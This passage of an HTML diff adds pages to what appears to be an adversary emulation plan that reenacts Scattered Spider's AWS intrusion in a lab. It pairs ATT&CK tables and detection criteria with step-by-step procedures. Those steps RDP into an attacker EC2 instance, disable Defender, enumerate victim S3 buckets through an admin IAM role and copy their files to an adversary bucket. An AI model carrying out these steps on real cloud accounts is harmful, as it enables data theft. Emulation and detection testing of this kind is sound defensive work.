+&quot;Anywhere-IPv4&quot;. Then click &quot;Save rules&quot;</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td>T1078.002</td>
+<td>Valid Accounts: Domain Accounts</td>
+<td>Linux, Identity Provider</td>
+<td>Adversary successfully authenticated to AWS as sstark</td>
+<td>Not Calibrated - Not Benign</td>
+<td>Scattered Spider authenticates to the domain as <code v-pre>sstark</code></td>
+<td>bloodygate (10.26.5.101)</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trellix.com/blogs/research/scattered-spider-the-modus-operandi/" class="outbound" target="_blank"><span>13</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1059.009</td>
+<td>Command and Scripting Interpreter: Cloud API</td>
+<td>IaaS</td>
+<td>sstark executed AWS CloudShell</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses AWS CloudShell</td>
+<td>-</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1098.003</td>
+<td>Account Manipulation: Additional Cloud Roles</td>
+<td>IaaS</td>
+<td>sstark created an admin IAM role (sisterton-role) and associated instance profile</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates an admin IAM role and associated instance profile to attach to EC2 instances.</td>
+<td>-</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1098.001</td>
+<td>Account Manipulation: Additional Cloud Credentials</td>
+<td>IaaS</td>
+<td>sstark created an SSH key pair for accessing EC2 instances</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates an SSH key pair for accessing EC2 instances.</td>
+<td>-</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1578.002</td>
+<td>Modify Cloud Compute Infrastructure: Create Cloud Instance</td>
+<td>IaaS</td>
+<td>sstark created an EC2 instance called sisterton-role</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates an EC2 instance</td>
+<td>-</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1098.003</td>
+<td>Account Manipulation: Additional Cloud Roles</td>
+<td>IaaS</td>
+<td>sstark configured the sisterton EC2 instance with the administrator IAM role and associated instance profile</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider configures the EC2 instance with the administrator IAM role and associated instance profile</td>
+<td>-</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1562.007</td>
+<td>Impair Defenses: Disable or Modify Cloud Firewall</td>
+<td>IaaS</td>
+<td>sstark added a security group rule to allow RDP</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider adds a security group rule to allow RDP</td>
+<td>-</td>
+<td>sstark</td>
+<td>-</td>
+<td><a href="https://youtu.be/H0CmqRCx_R8?t=1146" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-proactive-hardening-recommendations/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-2---exfiltration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---exfiltration">#</doc-anchor-trigger>
+        <span>Step 2 - Exfiltration</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-1">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>With the adversary-created Windows EC2 instance, Scattered Spider connects to the
+instance via RDP and downloads S3 Browser. By authenticating using the EC2
+instance&#x27;s IAM role, Scattered Spider enumerates the victim organization&#x27;s S3 buckets
+using S3 Browser. Scattered Spider then uses S3 Browser to download files from the victim
+S3 bucket then exfiltrates them to their own adversary-controlled S3 bucket.</p>
+<doc-anchor-target id="procedures-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-2">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS EC2 console, right-click on the newly created instance, select
+&quot;Connect&quot;, then select &quot;RDP client&quot;. Under the &quot;Password&quot; section, click &quot;Get
+password&quot; and paste the SSH key that was saved earlier to Kali to get the
+<code v-pre>Administrator</code> password to the adversary Windows instance. Save the password to
+a text file on Kali.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From a command prompt on Kali, replace the <code v-pre>&lt;REPLACE_ADMIN_PW&gt;</code> with the
+password obtained in the previous procedure. Enclose the password with single
+quotes if the generated password contains special characters. Execute the
+following to RDP to the adversary Windows instance, press &#x27;y&#x27; if prompted to
+trust the certificate</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">xfreerdp3 +clipboard /u:Administrator /p:'&lt;REPLACE_ADMIN_PW&gt;' /v:10.115.5.100</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the RDP to the adversary Windows instance, if prompted with &quot;Do you want
+to allow your PC to be discoverable by other PCs and devices on this network?&quot;,
+select &quot;Yes&quot;.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the RDP to the adversary Windows instance, search for Virus and threat
+protection &gt; Manage settings &gt; disable all toggles</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the RDP to the adversary Windows instance, open Edge. In the first time
+use prompt, click &quot;Start without your data&quot; then in the following prompts,
+uncheck any boxes and confirm/continue. Once first time use is complete, browse
+to download S3 Browser</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://s3browser.com/download/s3browser-12-2-9.exe">https://s3browser.com/download/s3browser-12-2-9.exe</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Once the download has completed, open the Downloads folder then double click
+to execute and install S3 Browser to the adversary Windows instances. Accept the
+license agreement and click &quot;Next&quot; through the install configurations to use the
+defaults then &quot;Finish&quot; to open S3 browser.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser Add New Account window, for the &quot;Account Name&quot; enter &quot;vale&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser Add New Account window, for the &quot;Account Type&quot; select
+&quot;Amazon S3 via EC2 IAM Role&quot;. Leave the SSL checked then click &quot;Add new account&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the list of buckets, click to open REPLACE_WITH_S3_BUCKET_NAME</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Select all the contents of the bucket then click the &quot;Download&quot; button and
+set the location to the Downloads folder</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser toolbar, click Accounts &gt; Add new account.. to add the
+adversary S3 bucket</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser Add New Account window, for the &quot;Account Name&quot; enter
+&quot;backup&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser Add New Account window, for the &quot;Account Type&quot; select
+&quot;Amazon S3 Storage&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to Kali and obtain the adversary AWS access keys</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Copy the &quot;Access key ID&quot; to the clipboard. Return to the RDP to the Windows
+instance and in the S3 Browser Add New Account window, paste the clipboard
+contents into the &quot;Access Key ID&quot; field</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to Kali and copy the &quot;Secret access key&quot; to the clipboard. Return to
+the RDP to the Windows instance and in the S3 Browser Add New Account window,
+paste the clipboard contents into the &quot;Secret Access Key&quot; field</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Leave &quot;Encrypt Access Keys...&quot; unchecked and &quot;Use secure transfer&quot; checked
+then click &quot;Add new account&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser toolbar, click Accounts &gt; backup. In the prompt &quot;Would you
+like to add an External Bucket?&quot;, select &quot;Yes&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to Kali and copy the &quot;Bucket&quot; to the clipboard. Return to the RDP to
+the Windows instance and in the S3 Browser Add New Account window, paste the
+clipboard contents into the &quot;Bucket name&quot; field then click &quot;Add External bucket&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the S3 Browser, click &quot;Upload&quot; &gt; &quot;Upload folder(s)&quot;. Select all the
+downloaded files from the <code v-pre>vale</code> bucket and click &quot;Open&quot; to exfiltrate the files
+to the adversary bucket.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-1">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Lateral Movement</td>
+<td>T1021.001</td>
+<td>Remote Services: Remote Desktop Protocol</td>
+<td>Windows</td>
+<td>sstark connected to an adversary windows instance sisterton (10.115.5.100) using RDP</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider connects to adversary Windows instance <code v-pre>sisterton (10.115.5.100)</code> using RDP</td>
+<td>sisterton (10.115.5.100)</td>
+<td>Administrator</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Windows</td>
+<td>msedge.exe downloaded s3browser to sisterton (10.115.5.100)</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider downloads S3 browser to the adversary Windows instance</td>
+<td>sisterton (10.115.5.100)</td>
+<td>Administrator</td>
+<td>-</td>
+<td><a href="https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>T1098.003</td>
+<td>Account Manipulation: Additional Cloud Roles</td>
+<td>Windows</td>
+<td>Adversary authenticated to AWS via sisterton-role</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider authenticates to the AWS account via EC2 IAM role</td>
+<td>sisterton (10.115.5.100)</td>
+<td>Administrator</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1619</td>
+<td>Cloud Storage Object Discovery</td>
+<td>IaaS</td>
+<td>sisterton-role enumerates victim S3 buckets</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses S3 Browser to enumerate victim S3 buckets</td>
+<td>sisterton (10.115.5.100)</td>
+<td>Administrator</td>
+<td>-</td>
+<td><a href="https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>T1530</td>
+<td>Data from Cloud Storage</td>
+<td>IaaS</td>
+<td>sisterton-role downloaded files from S3 bucket to sisterton (10.115.5.100)</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses S3 Browser to download files from victim S3 bucket to the adversary Windows instance</td>
+<td>sisterton (10.115.5.100)</td>
+<td>Administrator</td>
+<td>-</td>
+<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a" class="outbound" target="_blank"><span>1</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>T1567.002</td>
+<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
+<td>IaaS</td>
+<td>Adversary exfiltrated files to an adversary S3 bucket</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses S3 Browser to exfiltrate files to an adversary S3 bucket</td>
+<td>sisterton (10.115.5.100)</td>
+<td>Administrator</td>
+<td>-</td>
